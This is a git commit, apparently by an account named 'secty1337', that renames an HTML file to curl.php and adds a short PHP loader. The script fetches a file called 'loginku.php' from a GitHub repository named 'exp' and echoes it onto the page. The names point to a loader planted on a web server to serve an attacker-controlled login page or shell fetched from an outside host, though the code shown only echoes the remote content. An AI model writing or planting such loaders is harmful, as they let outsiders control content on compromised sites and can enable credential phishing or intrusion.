2095f160cc9c6cae587e5b6eb388c2e3be82570d
secty1337 <nantube003@gmail.com>
2025-05-26 19:09:58 +0700

    Update and rename b07.html to curl.php

---
+++ curl.php
@@ -0,0 +1,16 @@
+<?php
+$pastebinUrl = 'https://raw.githubusercontent.com/secty1337/exp/refs/heads/main/loginku.php';
+
+function getContentFromUrl($url)
+{
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
+$htmlContent = getContentFromUrl($pastebinUrl);
+
+echo $htmlContent;
+?>
